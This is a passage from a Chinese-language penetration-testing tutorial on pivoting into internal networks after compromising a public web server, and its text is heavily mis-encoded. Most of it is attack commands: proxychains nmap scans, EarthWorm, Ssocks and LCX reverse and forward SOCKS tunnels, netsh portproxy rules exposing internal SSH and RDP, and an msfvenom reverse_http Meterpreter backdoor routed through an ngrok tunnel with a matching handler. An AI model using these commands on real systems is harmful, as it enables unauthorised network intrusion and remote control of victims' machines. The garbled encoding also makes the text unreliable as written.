å¦‚å›¾ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»å¯ä»¥è®¿é—®å†…â½¹çš„WebæœåŠ¡å™¨ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›â¼€æ­¥æ¸—é€äº†ï¼ è¿™â¾¥éœ€è¦ä¸»è¦ï¼Œä½¿â½¤nmapç¨‹åºæ—¶åº”è¯¥æ³¨æ„çš„ç‚¹ #ä¸èƒ½ä½¿â½¤nmapé»˜è®¤çš„æ‰«æâ½…å¼ï¼Œä¸èƒ½ä½¿â½¤-A -T4å‚æ•° proxychains nmap -Pn -sT -p 1-10000 -v 192.168.10.19 10-9-2 EW(EarthWorm)ç»“åˆproxychainsä»£ç†é“¾EW æ˜¯â¼€å¥—ä¾¿æºå¼çš„â½¹ç»œç©¿é€â¼¯å…·ï¼Œå…·æœ‰ SOCKS5æœåŠ¡æ¶è®¾å’Œç«¯â¼è½¬å‘ä¸¤â¼¤æ ¸â¼¼åŠŸèƒ½ï¼Œå¯åœ¨å¤æ‚â½¹ç»œç¯å¢ƒä¸‹å®Œæˆâ½¹ç»œç©¿é€ã€‚è¯¥â¼¯å…·èƒ½å¤Ÿä»¥â€œæ­£å‘â€ã€â€œåå‘â€ã€â€œå¤šçº§çº§è”â€ç­‰â½…å¼æ‰“é€šâ¼€æ¡â½¹ç»œéš§é“ï¼Œç›´è¾¾â½¹ç»œæ·±å¤„ï¼Œâ½¤èš¯èš“ç‹¬æœ‰çš„â¼¿æ®µçªç ´â½¹ç»œé™åˆ¶ï¼Œç»™é˜²â½•å¢™æ¾â¼Ÿã€‚â¼¯å…·åŒ…ä¸­æä¾›äº†å¤šç§å¯æ‰§â¾â½‚ä»¶ï¼Œä»¥é€‚â½¤ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼ŒLinuxã€Windowsã€MacOSã€Arm-Linux å‡è¢«åŒ…æ‹¬å…¶å†…,å¼ºçƒˆæ¨èä½¿â½¤ï¼Œè·¨å¹³å°ï¼Œä»»ä½•å¹³å°éƒ½ å¯ä»¥è½»æ¾ä½¿â½¤ï¼ ç°åœ¨æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å–åˆ°äº†ä½äºå…¬â½¹WebæœåŠ¡å™¨çš„æƒé™ï¼Œå†…â½¹ä¸­å­˜åœ¨å¦å¤–â¼€å°ä¸»æœºï¼Œè¿™â¾¥å‡è®¾å†…â½¹å­˜åœ¨â¼€å°WebæœåŠ¡å™¨ã€‚ç„¶åï¼Œæˆ‘ä»¬ç°åœ¨è¦å°†å…¬â½¹WebæœåŠ¡å™¨è®¾ç½®ä¸ºä»£ç†ï¼Œè®¿é—®å’Œæ¢æµ‹å†…â½¹WebæœåŠ¡å™¨çš„ä¿¡æ¯ã€‚ ä¸ç®¡æ˜¯linuxè¿˜æ˜¯windowsç³»ç»Ÿï¼ŒEarthwormçš„åŒ…éƒ½æ˜¯â¼€ä¸ªï¼Œå¦‚å›¾ä¸Šâ¾¯ã€‚ç›´æ¥è¿›â¼ŠåŒ…â¾¥â¾¯ï¼Œé€‰æ‹©å¯¹åº”çš„ç¨‹åºå³å¯æ‰§â¾ 2-1 EWæ­£å‘ä»£ç†WebæœåŠ¡å™¨çš„è®¾ç½® ## å¦‚æœæ˜¯Linuxç³»ç»Ÿ .ew_for_linux64 -s ssocksd -l 1080 #ç›‘å¬æœ¬åœ°çš„1080ç«¯â¼ ## å¦‚æœæ˜¯Windowsç³»ç»Ÿ ew_for_Win.exe -s ssocksd -l 1080 #ç›‘å¬æœ¬åœ°çš„1080ç«¯â¼ æˆ‘ä»¬ä¸»æœºçš„è®¾ç½® ## å¦‚æœæ˜¯Linuxç³»ç»Ÿï¼Œé…ç½®proxychainsä»£ç†é“¾çš„é…ç½®â½‚ä»¶ï¼Œå°†ä»£ç†è®¾ç½®æˆ 100.100.10.12çš„1080ç«¯â¼ï¼š socks5 100.100.10.12 1080 ## ç„¶åå‘½ä»¤å‰â¾¯åŠ ä¸Š proxychainså³å¯ã€‚å¦‚ï¼š proxychains curl 192.168.10.19 ## å¦‚æœæ˜¯Windowsç³»ç»Ÿï¼Œç›´æ¥æµè§ˆå™¨ä¸­è®¾ç½®ä»£ç†ä¸º 100.100.10.12çš„1080ç«¯â¼ï¼Œæˆ–è€…åˆ©â½¤ Proxifierã€sockscap64 è®¾ç½®å…¨å±€ä»£ç† 2-2 EWåå‘ä»£ç†WebæœåŠ¡å™¨çš„è®¾ç½® ## å¦‚æœæ˜¯Linuxç³»ç»Ÿï¼š .ew_for_linux64 -s rssocks -d 100.100.10.13 -e 8888 #å°†æœ¬æœºçš„æµé‡å…¨éƒ¨è½¬å‘åˆ° 100.100.10.13çš„8888ç«¯â¼ ## å¦‚æœæ˜¯Windowsç³»ç»Ÿï¼š ew_for_Win.exe -s rssocks -d 100.100.10.13 -e 8888 #å°†æœ¬æœºçš„æµé‡å…¨éƒ¨è½¬å‘åˆ° 100.100.10.13çš„8888ç«¯â¼ æˆ‘ä»¬ä¸»æœºçš„è®¾ç½® ## å¦‚æœæ˜¯Linuxç³»ç»Ÿï¼š .ew_for_linux64 -s rcsocks -l 1080 -e 8888 #å°†æœ¬æœºçš„8888ç«¯â¼çš„æµé‡éƒ½è½¬å‘ç»™1080ç«¯â¼ï¼Œè¿™â¾¥8888ç«¯â¼åªæ˜¯â½¤äºä¼ è¾“æµé‡ ## ç„¶åé…ç½®proxychainsä»£ç†é“¾çš„é…ç½®â½‚ä»¶ï¼Œå°†ä»£ç†è®¾ç½®æˆ 127.0.0.1çš„1080ç«¯â¼ï¼š socks5 127.0.0.1 1080 ## ç„¶åå‘½ä»¤å‰â¾¯åŠ ä¸Š proxychainså³å¯ã€‚å¦‚ï¼š proxychains curl 192.168.10.19 ## å¦‚æœæ˜¯Windowsç³»ç»Ÿ ew_for_Win.exe -s rcsocks -l 1080 -e 8888 #å°†æœ¬æœºçš„8888ç«¯â¼çš„æµé‡éƒ½è½¬å‘ç»™1080ç«¯â¼ï¼Œè¿™â¾¥8888ç«¯â¼åªæ˜¯â½¤äºä¼ è¾“æµé‡ ## ç„¶åæµè§ˆå™¨ä¸­è®¾ç½®ä»£ç†ä¸º 100.100.10.12çš„1080ç«¯â¼ï¼Œæˆ–è€…åˆ©â½¤ Proxifier ã€sockscap64 è®¾ç½®å…¨å±€ä»£ç† 10-9-3 Ssocksæ­£å‘ä»£ç†(Linux)Ssocksæ˜¯Linuxä¸‹â¼€æ¬¾socksä»£ç†â¼¯å…·å¥—è£…ï¼Œå¯â½¤æ¥å¼€å¯socksä»£ç†æœåŠ¡ï¼ŒSsocksâ½€æŒsocks5éªŒè¯ï¼Œâ½€æŒipv6å’ŒUPï¼Œå¹¶æä¾›åå‘socksä»£ç†æœåŠ¡ã€‚ä½†æ˜¯ç”±äºSsocksä¸ç¨³å®šï¼Œæ‰€ä»¥ä¸å»ºè®®ä½¿â½¤ã€‚ ç°åœ¨æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å–åˆ°äº†ä½äºå…¬â½¹WebæœåŠ¡å™¨çš„shellï¼Œè¯¥webæœåŠ¡å™¨æ˜¯Linuxç³»ç»Ÿï¼Œå†…â½¹ä¸­å­˜åœ¨å¦å¤–â¼€å°ä¸»æœºï¼Œè¿™â¾¥å‡è®¾å†…â½¹å­˜åœ¨â¼€å°WebæœåŠ¡å™¨ã€‚ç„¶åï¼Œæˆ‘ä»¬ç°åœ¨è¦å°†å…¬â½¹WebæœåŠ¡å™¨è®¾ç½®ä¸ºä»£ç†ï¼Œè®¿é—®å’Œæ¢æµ‹å†…â½¹WebæœåŠ¡å™¨çš„ä¿¡æ¯ã€‚ â¾¸å…ˆï¼Œæˆ‘ä»¬çš„ä¸»æœºå’Œå…¬â½¹çš„WebæœåŠ¡å™¨éƒ½å¾—å®‰è£…ä¸ŠSsocksã€‚ å®‰è£…Ssocksçš„è¯ï¼Œç›´æ¥å®‰è£…åŒ…å®‰è£…ï¼Œè½¯ä»¶ä¼šè¢«å®‰è£…åœ¨ usrlocalbinâ½¬å½•ä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å»è¯¥â½¬å½•æ‰§â¾å‘½ä»¤ã€‚ 3-1 æ­£å‘ä»£ç†WebæœåŠ¡å™¨çš„æ“ä½œ .rssocks -vv -s 100.100.10.13:9999 #æ¥æ”¶100.100.10.13çš„9999ç«¯â¼çš„æµé‡ æˆ‘ä»¬ä¸»æœºçš„æ“ä½œ ## â¾¸å…ˆé…ç½®proxychainsä»£ç†é“¾çš„é…ç½®â½‚ä»¶ï¼ŒæŠŠæœ€åçš„å†…å®¹æ”¹æˆ socks5 127.0.0.1 8080 .rcsocks -l 1080 -p 9999 -vv #ç„¶åå°†æœ¬åœ°çš„1080ç«¯â¼çš„æµé‡è½¬å‘åˆ°9999ç«¯â¼ ## æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æƒ³è¦è®¿é—®å’Œæ“ä½œæ“ä½œå†…â½¹ä¸»æœº192.168.10.19çš„è¯ï¼Œåªéœ€è¦åœ¨å‘½ä»¤å‰â¾¯åŠ ä¸Š proxychains â½å¦‚ï¼Œè·å¾—å†…â½¹WebæœåŠ¡å™¨çš„â½¹â»šâ½‚ä»¶ï¼š proxychains curl 192.168.10.19 å¦‚æœè¿™â¾¥æˆ‘ä»¬çš„ä¸»æœºæ˜¯Windowsç³»ç»Ÿçš„è¯ï¼ŒWindowsç³»ç»Ÿä¸‹ä¹Ÿæœ‰å¾ˆå¤šä»£ç†â¼¯å…·ï¼Œâ½å¦‚ Proxifierã€sockscap64 10-9-4 Netshå®ç°ç«¯â¼è½¬å‘Netsh æ˜¯Windowsâ¾ƒå¸¦çš„å‘½ä»¤â¾è„šæœ¬â¼¯å…·ï¼Œå®ƒå¯ä»¥å»ºâ½´ç«¯â¼æ˜ å°„ã€‚ ç°åœ¨æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œå†…â½¹ä¸­æœ‰â¼€å°WebæœåŠ¡å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¤„äºå…¬â½¹ï¼Œæ‰€ä»¥â½†æ³•è®¿é—®è¯¥æœåŠ¡å™¨ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸­é—´WebæœåŠ¡å™¨ä¸Šåˆ©â½¤Netshå®ç°â¼€ä¸ªç«¯â¼æ˜ å°„ï¼Œåªè¦æˆ‘ä»¬è®¿é—®ä¸­é—´WebæœåŠ¡å™¨å…¬â½¹åœ°å€çš„æŒ‡å®šç«¯â¼ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬è®¿é—®å†…â½¹WebæœåŠ¡å™¨çš„80ç«¯â¼ã€‚ ä¸­é—´WebæœåŠ¡å™¨çš„é…ç½® netsh interface portproxy add v4tov4 listenaddress100.100.10.11 listenport8080 connectaddress192.168.10.19 connectport80 #æ–°å»ºâ¼€ä¸ªç«¯â¼æ˜ å°„ï¼Œå°†100.100.10.11çš„8080ç«¯â¼å’Œ192.168.10.19çš„80ç«¯â¼åšä¸ªæ˜ å°„ netsh interface portproxy show all #æŸ¥çœ‹ç«¯â¼æ˜ å°„ netsh interface portproxy delete v4tov4 listenaddress100.100.10.11 listenport8080 #åˆ é™¤ç«¯â¼æ˜ å°„ é‚£ä¹ˆï¼Œæˆ‘ä»¬é€šè¿‡è®¿é—®WebæœåŠ¡å™¨çš„å…¬â½¹åœ°å€çš„8080ç«¯â¼å°±å¯ä»¥è®¿é—®å†…â½¹ä¸­çš„WebæœåŠ¡å™¨äº†ã€‚ 10-9-5 Netshå®ç°SSHåˆ°å†…â½¹ä¸»æœº(è¿œç¨‹ç«¯â¼è½¬å‘)ç°åœ¨æˆ‘ä»¬æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å¾—äº†å…¬â½¹æœåŠ¡å™¨çš„æƒé™ï¼Œå¹¶ä¸”é€šè¿‡å…¬â½¹æœåŠ¡å™¨è¿›â¼€æ­¥çš„å†…â½¹æ¸—é€ï¼Œå¾—åˆ°äº†å†…â½¹ä¸»æœºçš„æƒé™ã€‚æ‹“æ‰‘å›¾å¦‚ä¸‹ã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©â½¤windowsâ¾ƒå¸¦çš„Netshæ¥è¿›â¾22ç«¯â¼çš„è½¬å‘ã€‚åœ¨å…¬â½¹windowsæœåŠ¡å™¨ä¸Šçš„æ“ä½œ netsh interface portproxy add v4tov4 listenaddress100.100.10.14 listenport2222 connectaddress192.168.10.129 connectport22 #ç›‘å¬ 100.100.10.14çš„2222ç«¯â¼ï¼Œæ˜ å°„åˆ°192.168.10.129 çš„22ç«¯â¼ä¸Š æ‰€ä»¥ï¼Œæˆ‘ä»¬sshè¿æ¥åˆ°å…¬â½¹æœåŠ¡å™¨çš„2222ç«¯â¼å³å¯ 10-9-6 Netshå®ç°3389åˆ°å†…â½¹ä¸»æœº(è¿œç¨‹ç«¯â¼è½¬å‘)ç°åœ¨æˆ‘ä»¬æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å¾—äº†å…¬â½¹æœåŠ¡å™¨çš„æƒé™ï¼Œå¹¶ä¸”é€šè¿‡å…¬â½¹æœåŠ¡å™¨è¿›â¼€æ­¥çš„å†…â½¹æ¸—é€ï¼Œå¾—åˆ°äº†å†…â½¹ä¸»æœºçš„æƒé™ã€‚æ‹“æ‰‘å›¾å¦‚ä¸‹ã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©â½¤Windowsâ¾ƒå¸¦çš„Netshæ¥è¿›â¾3389ç«¯â¼çš„æ˜ å°„ã€‚åœ¨å…¬â½¹windowsæœåŠ¡å™¨ä¸Šçš„æ“ä½œ netsh interface portproxy add v4tov4 listenaddress100.100.10.14 listenport3340 connectaddress192.168.10.152 connectport3389 äºæ˜¯ï¼Œæˆ‘ä»¬è¿œç¨‹3389è¿æ¥å…¬â½¹æœåŠ¡å™¨100.100.10.14çš„3340ç«¯â¼ 10-9-7 Netshå®ç°æœ¬åœ°ç«¯â¼è½¬å‘ç°åœ¨æˆ‘ä»¬æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å¾—äº†å…¬â½¹æœåŠ¡å™¨çš„æƒé™ï¼Œå¹¶ä¸”è·å¾—äº†è¯¥æœåŠ¡å™¨çš„è´¦å·å¯†ç ã€‚è¯¥æœåŠ¡å™¨çš„3389ç«¯â¼ä¹Ÿå¼€æ”¾ç€ï¼Œä½†æ˜¯åªå¯¹å†…å¼€æ”¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å°±éœ€è¦åšæœ¬åœ°ç«¯â¼æ˜ å°„ï¼Œå°†3389ç«¯â¼çš„æµé‡æ˜ å°„åˆ°å…¶ä»–ç«¯â¼ã€‚ è¯¥æœåŠ¡å™¨çš„æ“ä½œ netsh interface portproxy add v4tov4 listenaddress192.168.10.15 listenport13389 connectaddress192.168.10.15 connectport3389 åªéœ€è¦è¿œç¨‹è¿æ¥è¯¥ä¸»æœºçš„13389ç«¯â¼å³å¯ 10-9-8 LCXå®ç°ç«¯â¼è½¬å‘Lcxæ˜¯åŸºäºsocketå¥—æ¥å­—å®ç°çš„ç«¯â¼è½¬å‘â¼¯å…·ï¼Œæœ‰Windowså’ŒLinuxç‰ˆæœ¬ã€‚ ç°åœ¨æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œå†…â½¹ä¸­æœ‰â¼€å°WebæœåŠ¡å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¤„äºå…¬â½¹ï¼Œæ‰€ä»¥â½†æ³•è®¿é—®è¯¥æœåŠ¡å™¨ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸­é—´WebæœåŠ¡å™¨ä¸Šåˆ©â½¤LCXè¿›â¾ç«¯â¼è½¬å‘ï¼Œå°†å…¬â½¹WebæœåŠ¡å™¨çš„8080ç«¯â¼æµé‡è½¬å‘åˆ°å†…â½¹Webä¸»æœºçš„80ç«¯â¼ä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬è®¿é—®å…¬â½¹WebæœåŠ¡å™¨çš„8080ç«¯â¼å°±ç›¸å½“äºè®¿é—®å†…â½¹WebæœåŠ¡å™¨çš„80ç«¯â¼ã€‚ å…¬â½¹webæœåŠ¡å™¨çš„é…ç½® lcx.exe -tran 8080 192.168.10.19 80 #å°†æœ¬åœ°çš„8080ç«¯â¼æµé‡è½¬å‘åˆ°192.168.10.19çš„80ç«¯â¼ä¸Š å½“æˆ‘ä»¬è®¿é—®å…¬â½¹æœåŠ¡å™¨çš„8080ç«¯â¼æ—¶ï¼Œå°±ç›¸å½“äºè®¿é—®å†…â½¹æœåŠ¡å™¨çš„80ç«¯â¼ 10-9-9 LCXå®ç°æœ¬åœ°ç«¯â¼è½¬å‘(Windowsçš„åœºæ™¯)æˆ‘ä»¬ç°åœ¨æ‹¿åˆ°äº†â¼€å°ä¸»æœºçš„è´¦å·ã€å¯†ç å’Œæƒé™ï¼Œç°åœ¨æƒ³è¿œç¨‹RDPè¿æ¥è¯¥ä¸»æœºï¼Œè¯¥ä¸»æœºçš„3389ç«¯â¼åªå¯¹å†…å¼€æ”¾ï¼Œä¸å¯¹å¤–å¼€æ”¾ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©â½¤lcxè¿›â¾æœ¬åœ°ç«¯â¼çš„è½¬å‘ã€‚å°†3389çš„æµé‡è½¬åˆ°33389ç«¯â¼ä¸Šã€‚ â½¬æ ‡æœºçš„æ“ä½œï¼Œå°†3389ç«¯â¼çš„æµé‡è½¬å‘ç»™33389ç«¯â¼ lcx.exe -tran 33389 127.0.0.1 3389 åªéœ€è¦è¿œç¨‹è¿æ¥â½¬æ ‡ä¸»æœºçš„33389ç«¯â¼å³å¯ 10-9-10 LCXå®ç°æœ¬åœ°ç«¯â¼è½¬å‘(Linuxçš„åœºæ™¯)æˆ‘ä»¬ç°åœ¨æ‹¿åˆ°äº†â¼€å°ä¸»æœºçš„è´¦å·ã€å¯†ç å’Œæƒé™ï¼Œç°åœ¨æƒ³è¿œç¨‹SSHè¿æ¥è¯¥ä¸»æœºï¼Œè¯¥ä¸»æœºçš„22ç«¯â¼åªå¯¹å†…å¼€æ”¾ï¼Œä¸å¯¹å¤–å¼€æ”¾ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©â½¤lcxè¿›â¾æœ¬åœ°ç«¯â¼çš„è½¬å‘ã€‚å°†2222çš„æµé‡è½¬åˆ°22ç«¯â¼ä¸Šã€‚ â½¬æ ‡æœºçš„æ“ä½œï¼Œå°†2222ç«¯â¼çš„æµé‡éƒ½è½¬å‘åˆ°22ç«¯â¼ä¸Š .lcx -m l -pl 2222 -h2 127.0.0.1 -p2 22 10-9-11 LCXå®ç°SSHåˆ°å†…â½¹ä¸»æœº(å…¬â½¹æœåŠ¡å™¨æ˜¯Windows)ç°åœ¨æˆ‘ä»¬æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å¾—äº†å…¬â½¹æœåŠ¡å™¨çš„æƒé™ï¼Œå¹¶ä¸”é€šè¿‡å…¬â½¹æœåŠ¡å™¨è¿›â¼€æ­¥çš„å†…â½¹æ¸—é€ï¼Œå¾—åˆ°äº†å†…â½¹ä¸»æœºçš„æƒé™ã€‚æ‹“æ‰‘å›¾å¦‚ä¸‹ã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©â½¤lcxæ¥è¿›â¾22ç«¯â¼çš„è½¬å‘ã€‚ åœ¨å…¬â½¹windowsæœåŠ¡å™¨ä¸Šçš„æ“ä½œ lcx.exe -tran 2222 192.168.10.129 22 #æ„æ€å°±æ˜¯å°†æœ¬åœ°2222ç«¯â¼è½¬å‘ç»™192.168.10.129ä¸»æœºçš„22å·ç«¯â¼ æ‰€ä»¥ï¼Œæˆ‘ä»¬sshè¿æ¥åˆ°å…¬â½¹æœåŠ¡å™¨çš„2222ç«¯â¼å³å¯ 10-9-12 LCXå®ç°SSHåˆ°å†…â½¹ä¸»æœº(å…¬â½¹æœåŠ¡å™¨æ˜¯Linux) â¾¸å…ˆï¼Œåœ¨VPSä¸Šè¿›â¾ä¸‹â¾¯æ“ä½œã€‚ç›‘å¬ 2222 çš„æµé‡ï¼Œå°†å…¶è½¬å‘ç»™ 22222 ç«¯â¼ã€‚ç›¸å½“äºæ­£å‘ä»£ç† .lcx -m 2 -p1 22222 -h2 127.0.0.1 -p2 2222 #å°†æœ¬åœ°2222ç«¯â¼çš„æµé‡ç»™æœ¬åœ°çš„22222ç«¯â¼ åœ¨å†…â½¹ä¸»æœºä¸Šæ“ä½œï¼Œå°†22ç«¯â¼çš„æµé‡è½¬å‘åˆ°VPS(114.118.80.138)çš„22222ç«¯â¼ã€‚ç›¸å½“äºåå‘ä»£ç† .lcx -m 3 -h1 127.0.0.1 -p1 22 -h2 114.118.80.138 -p2 22222 #å°†æœ¬åœ°22ç«¯â¼çš„æµé‡ç»™114.118.80.138çš„22222ç«¯â¼ æˆ‘ä»¬è¿æ¥VPSçš„2222ç«¯â¼ï¼Œå°±ç›¸å½“äºè¿æ¥äº†å†…â½¹ä¸»æœºçš„22ç«¯â¼ã€‚ ssh root@114.118.80.138 2222 #è¿æ¥åˆ°114.118.80.138çš„2222ç«¯â¼ 10-9-13 LCXå®ç°3389åˆ°å†…â½¹ä¸»æœº(å…¬â½¹æœåŠ¡å™¨æ˜¯Windows)ç°åœ¨æˆ‘ä»¬æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å¾—äº†å…¬â½¹WindowsæœåŠ¡å™¨çš„æƒé™ï¼Œå¹¶ä¸”é€šè¿‡å…¬â½¹æœåŠ¡å™¨è¿›â¼€æ­¥çš„å†…â½¹æ¸—é€ï¼Œå¾—åˆ°äº†å†…â½¹Linuxä¸»æœºçš„æƒé™ã€‚æ‹“æ‰‘å›¾å¦‚ä¸‹ã€‚æˆ‘ä»¬ç°åœ¨æƒ³SSHåˆ°å†…â½¹Linuxä¸»æœºã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©â½¤lcxæ¥è¿›â¾3389ç«¯â¼çš„è½¬å‘ã€‚åœ¨å…¬â½¹windowsæœåŠ¡å™¨ä¸Šçš„æ“ä½œ lcx.exe -tran 3340 192.168.10.18 3389 #æ„æ€å°±æ˜¯å°†æœ¬åœ°çš„3340ç«¯â¼çš„æµé‡è½¬å‘ç»™192.168.10.18ä¸»æœºçš„3389ç«¯â¼ äºæ˜¯ï¼Œæˆ‘ä»¬è¿œç¨‹è¿æ¥å…¬â½¹æœåŠ¡å™¨100.100.10.14çš„3340ç«¯â¼ 10-9-14 LCXå®ç°3389åˆ°å†…â½¹ä¸»æœº(å…¬â½¹æœåŠ¡å™¨æ˜¯Linux)ç°åœ¨æˆ‘ä»¬æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å¾—äº†å…¬â½¹LinuxæœåŠ¡å™¨çš„æƒé™ï¼Œå¹¶ä¸”é€šè¿‡å…¬â½¹æœåŠ¡å™¨è¿›â¼€æ­¥çš„å†…â½¹æ¸—é€ï¼Œå¾—åˆ°äº†å†…â½¹Windowsä¸»æœºçš„æƒé™ã€‚æ‹“æ‰‘å›¾å¦‚ä¸‹ã€‚ç°åœ¨æˆ‘ä»¬æƒ³3389è¿æ¥åˆ°å†…â½¹WindowsæœåŠ¡å™¨ã€‚ åœ¨å…¬â½¹LinuxæœåŠ¡å™¨ä¸Šçš„æ“ä½œ .lcx -m 2 -p1 23389 -h2 127.0.0.1 -p2 13389 #ç›‘å¬æœ¬åœ°23389çš„æµé‡è½¬å‘ç»™æœ¬åœ°çš„13389ç«¯â¼ï¼Œæ­£å‘ä»£ç† åœ¨å†…â½¹WindowsæœåŠ¡å™¨ä¸Šçš„æ“ä½œ lcx.exe -slave 192.168.10.20 13389 127.0.0.1 3389 #å°†æœ¬åœ°3389ç«¯â¼çš„æµé‡éƒ½è½¬å‘ç»™192.168.10.20ï¼Œåå‘ä»£ç† è¿œç¨‹è¿æ¥å…¬â½¹æœåŠ¡å™¨çš„23389ç«¯â¼å³å¯ 10-10 å†…ç½‘ç©¿é€10-10-1 Ngrokå†…ç½‘ç©¿é€(httpä»£ç†)å†…ç½‘ç©¿é€ï¼Œä¹Ÿå³ NAT ç©¿é€ï¼Œè¿›è¡Œ NAT ç©¿é€æ˜¯ä¸ºäº†ä½¿å…·æœ‰æŸä¸€ä¸ªç‰¹å®šæº IP åœ°å€å’Œæºç«¯å£å·çš„æ•°æ®åŒ…ä¸è¢«NAT è®¾å¤‡å±è”½è€Œæ­£ç¡®è·¯ç”±åˆ°å†…ç½‘ä¸»æœºï¼Œngrokæ˜¯ä¸€ä¸ªå†…ç½‘ç©¿é€çš„è§£å†³æ–¹æ¡ˆ,å®ƒä½¿å¾—ä½ æœ¬åœ°çš„æœåŠ¡å™¨å¯ä»¥è¢«å±€åŸŸç½‘å¤–çš„å…¬ç½‘è®¿é—®ï¼Œngorkæœ‰æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯è¿è¡Œåœ¨å…¬ç½‘æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è¿è¡Œåœ¨æœ¬åœ°æœåŠ¡å™¨ngrokï¼ŒæœåŠ¡ç«¯ä¼šå»ºç«‹httpå’ŒhttpsæœåŠ¡ï¼Œé»˜è®¤ç«¯å£80443ï¼Œä»¥åŠä¾›ngrokå®¢æˆ·ç«¯è¿æ¥çš„æœåŠ¡ï¼Œé»˜è®¤ç«¯å£4443ã€‚å®ƒæ˜¯å›½å¤–çš„ä¸€æ¬¾è€ç‰Œçš„å†…ç½‘ç©¿é€å·¥å…·ã€‚ https://ngrok.com/ å›½å¤–åœ°å€ https://www.ngrok.cc/ å›½å†…åœ°å€ ## æ”»å‡»æœºè¦å®‰è£…Ngrokï¼Œè¢«æ”»å‡»æœºåªéœ€è¦æ­£å¸¸å¯åŠ¨ ## ä¸‹è½½å¥½Ngrokçš„æ–‡ä»¶sunnyï¼Œæ¥åˆ°æ‰€åœ¨æ–‡ä»¶å¤¹ è¿è¡Œsunny .sunny clientid [éš§é“id] .sunny clientid bâ€¦.k ## æ˜¾ç¤ºonlineè¯´æ˜ç™»å½•æˆåŠŸã€‚è¢«æ”»å‡»æœºè®¿é—®Forwardingé‡Œçš„ç½‘å€ä¼šæŒ‡å‘åˆ°å¡«å†™çš„æœ¬åœ°ç«¯å£ç”Ÿæˆåé—¨ï¼Œæ³¨æ„é€‰æ‹©å¯¹åº”çš„ç½‘ç»œåè®®ï¼Œå¡«å†™å¥½åœ°å€ï¼š syrjaden.free.idcfengye.com æ˜¯æˆ‘ä»¬å¼€é€šéš§é“ä¹‹åç”Ÿæˆçš„ï¼Œåœ¨éš§é“ç®¡ç†çš„åœ°æ–¹æœ‰ msfvenom -p windowsmeterpreterreverse_http lhostsyrjaden.free.idcfengye.com lport80 -f exe -o jaden.exe ## ç›‘å¬åé—¨ï¼Œç›‘å¬ä¹‹å‰å¡«çš„æœ¬åœ°ç«¯å£ msfconsole use exploitmultihandler set payload windowsmeterpreterreverse_http set lhost 192.168.0.11 kaliæœ¬æœºçš„ipåœ°å€ set lport 6666 åœ¨éš§é“ä¸­æŒ‡å®šçš„ç«¯å£å· Exploit ## åœ¨è¢«æ”»å‡»æœºæ‰§è¡Œåé—¨ æ³¨å†Œè´¦å·ï¼Œç„¶åç™»å½• å¼€é€šéš§é“ è´­ä¹°å…è´¹æœåŠ¡å™¨ï¼Œç½‘é€Ÿå·®ç‚¹ï¼Œç„¶åå¡«å†™éš§é“ä¿¡æ¯ï¼š ä¸‹è½½å®¢æˆ·ç«¯ æ¼”ç¤ºç¤ºä¾‹ ä¸¤ä¸ªä¸åŒç½‘æ®µçš„å†…ç½‘ä¸»æœºå®ç°é€šä¿¡ã€‚ å‡†å¤‡ç¯å¢ƒï¼š (æ§åˆ¶ç«¯)æ”»å‡»ä¸»æœºkaliï¼Œå¤§å®¶å¯ä»¥ç”¨æœ€æ–°ç‰ˆçš„ (è¢«æ§ç«¯)ç›®æ ‡ä¸»æœºï¼šæˆ‘ç”¨çš„win7ï¼ŒæŒ‰ç…§æµç¨‹å¤§å®¶å¯ä»¥ä½¿ç”¨å…¶ä»–çš„ä¸»æœºç³»ç»Ÿ,å…ˆçœ‹ä¸€ä¸‹kaliçš„IPåœ°å€ ç„¶åä¿®æ”¹ä¸€ä¸‹ngrokéš§é“ä¸­çš„æ§åˆ¶æœºipå’Œç«¯å£ï¼Œå°±æ˜¯é‚£ä¸ªæœ¬åœ°ç«¯å£ é¦–å…ˆåœ¨æ§åˆ¶ç«¯kaliä¸­è¿è¡Œæˆ‘ä»¬ä¸‹è½½çš„Ngrokçš„å®¢æˆ·ç«¯ï¼Œæˆ‘æ”¾åœ¨äº†mntç›®å½•ä¸‹ 